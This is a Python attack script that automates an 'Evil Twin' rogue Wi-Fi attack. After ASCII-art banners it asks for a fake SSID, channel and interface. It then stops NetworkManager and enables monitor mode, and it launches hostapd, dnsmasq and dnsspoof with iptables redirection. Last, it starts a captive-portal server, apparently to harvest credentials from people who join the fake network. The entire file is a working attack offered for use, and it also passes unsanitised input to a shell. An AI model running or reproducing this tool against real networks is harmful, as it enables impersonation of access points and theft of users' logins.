import subprocess
from termcolor import cprint

cprint('''                                 */((((((((((((*                                
                        /((((((((((((((((((((((((((((((((                       
                   /((((((((((((((((((((((((((((((((((((((((((,                 
               (((((((((((((((((((((*,      *(((((((((((((((((((((,             
           /((((((((((((((*                            (((((((((((((((          
         ((((((((((((,                                      /(((((((((((/       
       ((((((((((/            ,(((((((((((((((((((*            ,((((((((((      
        (((((((          (((((((((((((((((((((((((((((((          *(((((((      
                     (((((((((((((((((((((((((((((((((((((((                    
                  ((((((((((((((/               *((((((((((((((                 
                 ((((((((((*                          ((((((((((                
                  ((((((             ,/(((/,             (((((((                
                               (((((((((((((((((((                              
                            (((((((((((((((((((((((((                           
                           ((((((((((((/*/((((((((((((,                         
                           ,((((((             (((((((                          
                                                                                
                                     (((((((,                                   
                                    (((((((((*                                  
                                    (((((((((                                   
                                       (((*''',"yellow")
                                       
cprint('''                                _   _                        _ 
               |██████|        (_) | |   |████████|         (_) 
               |██|     _   __  _  | |      |██|  _      __  _   _ __  
               |████|  \ \ / / | | | |      |██| \ \ /\ / / | | | '_ \ 
               |██|     \ V /  | | | |      |██|  \ V  V /  | | | | | |
               |██████|  \_/   |_| |_|      |██|   \_/\_/   |_| |_| |_|''',"red")

try:
    cprint("\nStarting Evil Twin Attack . . .","green")
    
    cprint("[+] Enter Fake AP SSID : ","green",end='')
    Fake_AP = input()
    cprint("[+] Enter Channel : ","yellow",end='')
    Ch = input()
    cprint("[+] Enter Interface : ","red",end='')
    Interface = input()
    
    __ = subprocess.check_output("systemctl stop NetworkManager", shell=True)
    __ = subprocess.check_output("airmon-ng start wlan0", shell=True)
    __ = subprocess.check_output("python3 FakeAuth_EvilTwin/configure_dnsmasq_hostapd.py "+Interface+" "+Fake_AP+" "+Ch, shell=True)

    subprocess.call(['gnome-terminal', "--geometry", "80x10+50+50", "--title", "Fake AP Data",'--', "hostapd", "FakeAuth_EvilTwin/hostapd.conf"])
    subprocess.call(['gnome-terminal',"--geometry", "80x15+50+300", "--title", "DNSMASQ Data" ,'--', "dnsmasq", "-C", "FakeAuth_EvilTwin/dnsmasq.conf", "-d"])

    subprocess.call(['gnome-terminal','--', "ifconfig", "wlan0mon", "up", "192.168.1.1", "netmask", "255.255.255.0"])
    subprocess.call(["route", "add", "-net", "192.168.1.0", "netmask", "255.255.255.0", "gw", "192.168.1.1"]) 

    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-d", "192.168.1.1", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"])

    subprocess.call(['gnome-terminal',"--geometry", "77x10+780+50", "--title", "DNS Spoof Data" , '--', "dnsspoof", "-i", "wlan0mon"])
    subprocess.call(['gnome-terminal',"--geometry", "77x15+780+300","--title", "Captive Portal" ,'--', "nodemon", "FakeAuth_EvilTwin/expressServer2.js"])
    subprocess.call(['xterm',"-geometry", "69x23+260+250","-title", "Evil Twin" ,"-bg" ,"black","-hold", "-e", "python3", "FakeAuth_EvilTwin/Info_EvilTwin.py", Fake_AP,Ch,Interface])
except KeyboardInterrupt:
    print("Error...")

